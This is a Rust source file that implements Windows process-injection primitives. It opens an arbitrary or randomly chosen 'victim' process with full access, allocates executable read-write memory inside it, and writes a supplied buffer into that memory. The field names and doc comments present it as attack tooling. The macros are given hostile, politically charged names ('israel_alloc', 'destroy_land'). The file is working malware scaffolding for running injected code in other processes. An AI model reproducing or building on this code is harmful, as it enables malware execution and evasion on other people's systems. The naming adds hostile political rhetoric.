use core::ffi::c_void;
use std::ptr::null_mut;

use windows::{
    Win32::{
        Foundation::HANDLE,
        System::{
            Diagnostics::Debug::WriteProcessMemory,
            Memory::{
                MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS,
                VIRTUAL_ALLOCATION_TYPE, VirtualAllocEx,
            },
            Threading::{OpenProcess, PROCESS_ALL_ACCESS},
        },
    },
    core::Error,
};

use crate::proc::ProcessSnapshot;

#[derive(Debug)]
pub struct ProcessMemoryInfo {
    pub victim_process_id: u32,
    pub block_ptr: *mut c_void,
}

pub struct AllocationWrapper {}

#[macro_export]
macro_rules! israel_alloc {
    ($p:expr,$seg:expr) => {
        AllocationWrapper::new().israel_alloc($p, $seg)
    };
}

#[macro_export]
macro_rules! destroy_land {
    ($p:expr, $buf:expr, $size:expr) => {
        AllocationWrapper::new().israel_commit(&$p, $buf, $size)
    };
}

impl AllocationWrapper {
    pub fn new() -> Self {
        Self {}
    }

    fn resolve_process_handle(&self, id: u32) -> Option<HANDLE> {
        unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, id).ok() }
    }

    /// Allocate a block of size `usize`. If you instead would like to commit a block
    /// to a SPECIFIC process, you may pass your own `ProcessMemoryInfo`.
    ///
    /// The returned `ProcessMemoryInfo` contains where the block starts,
    /// as well as the process ID of the victim process.
    ///
    /// Warning: This isnt a safe operation if you are using randomized
    /// process grabbing.
    pub fn israel_alloc(
        &mut self,
        size: usize,
        proc_inf: Option<ProcessMemoryInfo>,
    ) -> Option<ProcessMemoryInfo> {
        let mut rproc = ProcessSnapshot::new();

        let p_id = match proc_inf {
            Some(id_val) => id_val.victim_process_id,
            None => rproc.find_random_process_id(),
        };

        let raw_handle_ptr = self.resolve_process_handle(p_id)?;

        let ptr: *mut c_void = unsafe {
            VirtualAllocEx(
                raw_handle_ptr,
                None,
                size,
                VIRTUAL_ALLOCATION_TYPE(MEM_COMMIT.0 | MEM_RESERVE.0),
                PAGE_PROTECTION_FLAGS(PAGE_EXECUTE_READWRITE.0),
            )
        };

        Some(ProcessMemoryInfo {
            victim_process_id: p_id,
            block_ptr: ptr,
        })
    }

    /// Commit a win32 write operation to the provided block.
    /// This block is identified based on the provided `ProcessMemoryInfo`.
    ///
    /// Warning: Due to the nature of this program, somtimes the HANDLE may be invalid.
    /// Due to this, we recommend you pay attention to the returned `Result`.
    pub fn israel_commit(
        &mut self,
        atk: &ProcessMemoryInfo,
        buff: *const c_void,
        size: usize,
    ) -> Result<(), Error> {
        let block_start = atk.block_ptr;
        let p_id = atk.victim_process_id;

        let ptr: HANDLE;

        match self.resolve_process_handle(p_id) {
            Some(k) => ptr = k,
            None => ptr = HANDLE(null_mut()), /* Correct standard for handling invalid HANDLE objects. */
        }

        unsafe { WriteProcessMemory(ptr, block_start, buff, size, None) }
    }
}
